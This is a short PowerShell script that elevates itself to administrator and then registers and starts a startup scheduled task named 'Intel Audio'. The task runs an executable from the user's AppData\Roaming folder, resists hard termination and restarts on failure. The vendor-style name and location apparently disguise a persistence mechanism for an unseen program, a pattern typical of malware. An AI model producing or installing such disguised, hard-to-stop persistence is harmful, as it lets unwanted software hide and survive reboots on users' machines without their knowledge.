# Clear-Host
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
            $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
            Start-Process powershell -Verb runas -ArgumentList $CommandLine
            Exit
      }
}

$taskName = "Intel Audio"
$taskPath = "\Intel\Audio"
$trigger = New-ScheduledTaskTrigger -AtStartup 
$action = New-ScheduledTaskAction -Execute '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio\Intel Audio.exe' -WorkingDirectory '%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Audio'
$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -Priority 2 -RestartCount 3 

Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Action $action -Trigger $trigger -Settings $settings -AsJob 

Start-ScheduledTask -TaskName $taskName -TaskPath $taskPath